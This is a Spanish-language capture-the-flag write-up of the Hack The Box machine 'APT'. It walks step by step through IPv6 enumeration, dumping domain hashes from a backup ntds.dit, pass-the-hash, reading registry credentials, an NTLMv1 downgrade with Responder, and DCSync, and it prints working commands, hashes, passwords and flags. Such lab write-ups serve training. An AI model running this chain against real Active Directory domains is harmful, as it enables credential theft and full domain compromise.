# HTB - APT Writeup

> **OS:** Windows Server 2016  
> **Dificultad:** Hard  
> **IP:** 10.129.96.60  

---

## Reconocimiento

### Escaneo de puertos (IPv4)

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.60 -oG allPorts
```

**Puertos abiertos:**
- `80/tcp` → HTTP (Microsoft IIS)
- `135/tcp` → MSRPC

### Enumeración web (Gobuster)

```bash
gobuster dir -u http://10.129.96.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,aspx,txt,html
```

Se encontraron varias páginas estáticas (`index.html`, `about.html`, `services.html`, etc.) pero nada explotable directamente.

---

## Descubrimiento de IPv6 con IOXIDResolver

```bash
python3 IOXIDResolver.py -t 10.129.96.60
```

**Resultado:**
```
Address: apt
Address: 10.129.96.60
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::f0f0:732c:c209:57b4
Address: dead:beef::1e5
```

> La máquina filtra puertos por IPv4, pero expone todos los servicios por IPv6.

### Escaneo completo por IPv6

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG allPorts
```

**Puertos abiertos:** `53, 80, 88, 135, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, ...`

**Info relevante del escaneo de servicios:**
- Dominio: `htb.local`
- FQDN: `apt.htb.local`
- OS: Windows Server 2016 Standard 14393
- SMB signing: requerido

---

## Acceso SMB y backup.zip

```bash
crackmapexec smb dead:beef::b885:d62a:d679:573f -u "" -p "" --shares
```

Share `backup` accesible sin credenciales. Contiene `backup.zip`.

```bash
python3 smbclient.py htb.local/@dead:beef::b885:d62a:d679:573f
# use backup
# get backup.zip
```

### Contenido del ZIP

```
Active Directory/ntds.dit   (50 MB)
Active Directory/ntds.jfm
registry/SECURITY
registry/SYSTEM
```

### Crackeo de la contraseña del ZIP

```bash
zip2john backup.zip > hashes.txt
john -w:/usr/share/wordlists/rockyou.txt hashes.txt
```

**Contraseña:** `iloveyousomuch`

---

## Extracción de hashes con secretsdump

```bash
secretsdump.py -system registry/SYSTEM -ntds "Active Directory/ntds.dit" LOCAL > total_hashes.txt
```

Se obtienen todos los hashes del dominio.

---

## Enumeración de usuarios válidos (Kerbrute)

```bash
kerbrute userenum --dc apt -d htb.local users
```

**Usuarios válidos:**
- `Administrator@htb.local`
- `APT$@htb.local`
- `henry.vinson@htb.local`

---

## Acceso con henry.vinson (Pass-the-Hash)

Se prueba el hash de `henry.vinson` extraído del NTDS. El hash original falla, pero al hacer fuerza bruta de hashes por IPv6 con kerbrute se encuentra el hash correcto:

```bash
crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb' --shares
# [+] htb.local\henry.vinson
```

### Enumeración por RPC

```bash
rpcclient -U "henry.vinson" --pw-nt-hash apt
rpcclient $> enumdomusers
```

Se descubre un usuario adicional: `henry.vinson_adm`

---

## Credenciales en el Registro (impacket-reg)

```bash
impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb \
  query -keyName 'HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem'
```

**Resultado:**
```
UserName : henry.vinson_adm
PassWord : G1#Ny5@2dvht
```

### Shell con WinRM → User flag

```bash
evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
```

```
cat C:\Users\henry.vinson_adm\Desktop\user.txt
225c5a7e2df4e4b64d83a2b38c10d736
```

---

## Escalada de privilegios — NTLMv1 Downgrade Attack

### ¿Por qué funciona?

El sistema usa **NTLMv1** para autenticación, el cual es vulnerable porque:

1. Usa **DES** (claves de 56 bits) → rompible con hardware moderno
2. El hash NT puede crackearse **offline** capturando el challenge/respuesta
3. Existen **rainbow tables** precomputadas (ej. crack.sh) para romperlo en segundos
4. No necesitas la contraseña en texto plano → **Pass-the-Hash** directo

### Captura del hash NTLMv1

Se levanta Responder con downgrade forzado y se provoca una conexión SMB desde la máquina víctima:

```bash
sudo responder -I tun0 --lm
```

**Hash capturado:**
```
APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
```

> Challenge fijo `1122334455667788` → compatible con crack.sh / rainbow tables.

El hash se envía a **crack.sh** y se obtiene el NT hash de la cuenta de máquina `APT$`.

---

## DCSync y flag de root

Con el hash NT de `APT$` (cuenta de máquina del DC) se puede hacer **DCSync**:

```bash
secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
```

**Hash del Administrador:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
```

### Shell como Administrador → Root flag

```bash
evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt
```

```
cat C:\Users\Administrator\Desktop\root.txt
61e25bb70c25512f30b6a010265b2634
```

---

## Resumen del ataque

```
IPv4 limitado → IOXIDResolver → IPv6 expone todos los puertos
       ↓
SMB anónimo → backup.zip → ntds.dit + SYSTEM
       ↓
secretsdump → hashes de dominio → henry.vinson hash
       ↓
RPC enum → henry.vinson_adm existe
       ↓
impacket-reg → credenciales en registro → WinRM → user.txt
       ↓
NTLMv1 downgrade (Responder --lm) → captura hash APT$
       ↓
crack.sh rainbow table → NT hash APT$
       ↓
DCSync → hash Administrator → evil-winrm → root.txt
```

---

*Writeup by: kali | HTB Machine: APT*